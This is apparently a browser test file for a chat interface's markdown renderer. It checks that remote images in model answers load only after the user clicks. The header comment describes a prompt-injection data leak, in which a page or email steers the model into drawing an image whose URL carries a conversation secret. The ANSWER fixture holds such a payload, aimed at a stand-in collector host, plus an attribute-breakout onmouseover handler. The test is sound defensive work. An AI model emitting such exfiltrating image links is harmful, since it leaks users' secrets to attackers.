/* AN IMAGE IN AN ANSWER IS NOT FETCHED UNTIL SOMEBODY ASKS.  (AMV-AUD-023)

   Markdown `![x](https://...)` became an <img>, and a browser fetches an
   <img> the moment it is drawn. The address is written by the model, and the
   model can be steered by what it reads - so a page or an email could have it
   draw `![](https://collector.example/?d=<a secret from the conversation>)`,
   and simply showing the answer would send the secret. Now a remote image is
   a button naming the site, and nothing is fetched until it is pressed.

   Measured on the wire: every request the page makes is recorded, and the
   question is whether one went to the collector. */
import { bootApp } from '../lib/harness.mjs';
import { ok, section, report, done } from '../lib/assert.mjs';

const app = await bootApp({ tab: 'chat' });
const { page, errors } = app;

/* The cookie banner sits over the bottom of the page and takes the click
   otherwise - the first run of this suite passed only because of where the
   button happened to land. */
await page.evaluate(() => document.getElementById('cookie-consent-banner')?.remove());

const hits = [];
await page.context().route('https://collector.example/**', (route) => {
  hits.push(route.request().url());
  /* A one-pixel PNG, so a fetched image really loads. */
  route.fulfill({ status: 200, contentType: 'image/png',
    body: Buffer.from('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNkYAAAAAYAAjCB0C8AAAAASUVORK5CYII=', 'base64') });
});

const ANSWER = 'Here is the chart you asked for:\n\n![sales" onmouseover="window.__pwned=1](https://collector.example/px.png?d=the-users-secret&x=1)\n\nDone.';

section('Drawing an answer that names a remote image fetches nothing');
{
  const r = await page.evaluate((a) => {
    const host = document.createElement('div');
    host.id = 'md-test-host';
    host.innerHTML = md(a);
    document.getElementById('app').appendChild(host);
    const b = host.querySelector('button.md-img-ask');
    const injected = [...host.querySelectorAll('*')].some(el => [...el.attributes].some(at => /^on/i.test(at.name)));
    return { imgs: host.querySelectorAll('img').length, button: b ? b.textContent : '', html: host.innerHTML, injected };
  }, ANSWER);
  await page.waitForTimeout(800);
  ok(hits.length === 0, 'no request reached the address in the answer - this was the finding', hits);
  ok(r.imgs === 0, 'there is no <img> for the browser to fetch', r.html.slice(0, 200));
  ok(/Show image from collector\.example/.test(r.button), 'a button says which site the picture would come from', r.button);
  ok(r.injected === false, 'a caption written to break out of its attribute adds no handler to anything', r.html.slice(0, 300));
}

section('Pressing it fetches that picture, and only then');
{
  await page.click('#md-test-host button.md-img-ask');
  await page.waitForTimeout(800);
  const r = await page.evaluate(() => {
    const img = document.querySelector('#md-test-host img.chat-img');
    return { src: img ? img.getAttribute('src') : '', loaded: !!(img && img.complete && img.naturalWidth > 0),
             buttons: document.querySelectorAll('#md-test-host button.md-img-ask').length };
  });
  ok(hits.length === 1 && /d=the-users-secret&x=1/.test(hits[0]), 'exactly the address shown was fetched, once', hits);
  ok(r.loaded && r.buttons === 0, 'and the picture is in place of the button', r);
}

section('Chosen once, it is not asked about again when the thread repaints');
{
  const r = await page.evaluate((a) => {
    const h = document.getElementById('md-test-host');
    h.innerHTML = md(a);
    return { imgs: h.querySelectorAll('img.chat-img').length, buttons: h.querySelectorAll('button.md-img-ask').length };
  }, ANSWER);
  ok(r.imgs === 1 && r.buttons === 0, 'the same address draws directly for the rest of the session', r);
  const inj = await page.evaluate(() => [...document.querySelectorAll('#md-test-host *')].some(el => [...el.attributes].some(at => /^on/i.test(at.name))));
  ok(inj === false, 'and drawn directly, its caption still cannot add a handler', inj);
  const other = await page.evaluate(() => {
    const h = document.getElementById('md-test-host');
    h.innerHTML = md('![](https://collector.example/another.png)');
    return h.querySelectorAll('button.md-img-ask').length;
  });
  ok(other === 1, 'a different address still asks - the choice was about one picture, not a site', other);
}

section('Nothing threw');
ok(errors.length === 0, 'zero uncaught page errors', JSON.stringify(errors.slice(0, 3)));

await app.close();
report();
done();
